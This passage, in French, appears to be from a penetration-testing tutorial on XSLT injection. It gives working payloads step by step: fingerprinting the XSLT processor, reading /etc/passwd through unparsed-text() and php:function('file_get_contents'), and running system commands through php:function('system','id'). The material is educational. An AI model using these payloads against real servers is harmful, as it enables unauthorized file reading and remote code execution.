La réponse renvoie une erreur 500 Internal Server Error. Cela ne confirme pas encore la vulnérabilité, mais indique un comportement anormal pouvant résulter d'un traitement XSLT.

Information Disclosure

Pour confirmer l'injection, nous pouvons tenter d'injecter des éléments XSLT valides, par exemple pour récupérer des informations sur le processeur XSLT : 

Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />

La page affiche alors les informations du processeur XSLT, confirmant l'injection. Dans notre exemple, le moteur utilisé est libxslt en version XSLT 1.0.

Local File Inclusion (LFI)

Plusieurs fonctions peuvent permettre de lire des fichiers locaux, selon la version XSLT et la configuration du processeur.

Par exemple, XSLT 2.0 introduit la fonction unparsed-text() : 

<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

Mais notre application utilise XSLT 1.0, donc cette fonction échoue.

Cependant, si le processeur XSLT est configuré pour supporter les fonctions PHP, nous pouvons utiliser php:function() pour lire un fichier : 

<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

Dans notre exemple, cette fonction est supportée, et le contenu du fichier est affiché.

Remote Code Execution (RCE)

Si les fonctions PHP sont disponibles, il est également possible d'exécuter des commandes système. Par exemple, en appelant la fonction PHP system() : 

<xsl:value-of select="php:function('system','id')" />

La page affiche alors le résultat de la commande id, confirmant une exécution de code à distance.

Une XSLT injection avec support des fonctions PHP peut donc mener à une compromission complète du serveur.
